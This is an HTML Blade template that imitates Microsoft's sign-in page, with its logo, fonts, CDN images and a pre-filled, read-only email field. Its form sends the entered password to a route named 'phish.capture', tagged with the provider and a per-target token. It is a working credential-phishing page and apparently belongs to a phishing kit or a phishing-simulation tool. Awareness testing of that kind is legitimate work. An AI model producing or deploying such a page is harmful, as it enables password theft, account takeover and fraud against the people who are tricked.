<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Sign in</title>
    <link rel="icon" href="https://logincdn.msauth.net/shared/5/images/favicon/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Segoe UI","Segoe UI Web (West European)",-apple-system,system-ui,Roboto,"Helvetica Neue",sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;position:relative;overflow:hidden}
        .bg-img{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0}
        .main{flex:1;display:flex;align-items:center;justify-content:center;position:relative;z-index:1;padding:20px}
        .card{background:rgba(255,255,255,.95);backdrop-filter:blur(20px);padding:44px;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
        .close-btn{position:absolute;top:16px;right:16px;width:24px;height:24px;background:none;border:1px solid transparent;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;color:rgb(66,66,66);transition:background .1s}
        .close-btn:hover{background:rgba(0,0,0,.05)}
        .ms-logo{display:flex;align-items:center;margin-bottom:16px}
        .ms-logo svg{height:24px;width:auto}
        h1{font-size:24px;font-weight:600;color:rgb(36,36,36);margin-bottom:16px;line-height:32px}
        .form-group{margin-bottom:16px}
        .form-group label{display:block;font-size:14px;color:rgb(36,36,36);margin-bottom:8px;font-weight:400;line-height:20px}
        .input-wrap{position:relative}
        .input-wrap input{width:100%;height:38px;padding:0 18px 0 6px;font-size:16px;font-family:"Segoe UI",sans-serif;border:none;border-bottom:1px solid rgb(118,118,118);outline:none;background:rgba(0,0,0,0);color:rgb(36,36,36);transition:border-color .15s}
        .input-wrap input:focus{border-bottom:2px solid rgb(15,108,189)}
        .input-wrap input.error{border-bottom:2px solid rgb(196,49,75)}
        .forgot{font-size:14px;color:rgb(17,94,163);font-weight:600;background:none;border:none;cursor:pointer;padding:0;font-family:"Segoe UI",sans-serif}
        .forgot:hover{text-decoration:underline}
        .btn-next{width:100%;height:38px;background:rgb(15,108,189);color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:24px;font-family:"Segoe UI",sans-serif;transition:background .15s}
        .btn-next:hover{background:rgb(0,93,167)}
        .btn-next:active{background:rgb(0,78,142)}
        .create-link{display:block;margin-top:16px;font-size:14px;color:rgb(36,36,36);text-align:center}
        .create-link a{color:rgb(17,94,163);font-weight:600;text-decoration:none}
        .create-link a:hover{text-decoration:underline}
        .or-text{text-align:center;font-size:12px;color:rgb(128,128,128);margin:16px 0;position:relative}
        .or-text::before,.or-text::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#e1e1e1}
        .or-text::before{left:0}
        .or-text::after{right:0}
        .footer{padding:16px 24px;display:flex;justify-content:center;gap:16px;font-size:12px;color:rgb(66,66,66);position:relative;z-index:1}
        .footer a{color:rgb(66,66,66);text-decoration:none}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:32px 24px}}
    </style>
</head>
<body>
    <img class="bg-img" src="https://logincdn.msauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg" alt="">

    <div class="main">
        <div class="card">
            <button class="close-btn" aria-label="Close">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M1 1l12 12M13 1L1 13" stroke="currentColor" stroke-width="1.5"/></svg>
            </button>

            <div class="ms-logo">
                <svg viewBox="0 0 114 24" xmlns="http://www.w3.org/2000/svg">
                    <g fill="#737373">
                        <path d="M0 0h11.3v11.3H0z" fill="#F25022"/>
                        <path d="M12.7 0H24v11.3H12.7z" fill="#7FBA00"/>
                        <path d="M0 12.7h11.3V24H0z" fill="#00A4EF"/>
                        <path d="M12.7 12.7H24V24H12.7z" fill="#FFB900"/>
                    </g>
                    <text x="30" y="18" font-family="Segoe UI" font-size="16" font-weight="600" fill="#737373">Microsoft</text>
                </svg>
            </div>

            <h1>Sign in</h1>

            <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="email">Email or phone number</label>
                    <div class="input-wrap">
                        <input type="email" id="email" name="email" value="{{ $email }}" readonly style="cursor:default;background:#f5f5f5">
                    </div>
                </div>

                <div class="form-group" style="margin-top:24px">
                    <label for="password">Enter password</label>
                    <div class="input-wrap">
                        <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
                    </div>
                </div>

                <button type="button" class="forgot">Forgot your username?</button>

                <button type="submit" class="btn-next">Sign in</button>
            </form>

            <p class="create-link">New to Microsoft? <a href="#">Create an account</a></p>
        </div>
    </div>

    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy and cookies</a>
        <a href="#">Help and feedback</a>
    </div>
</body>
</html>
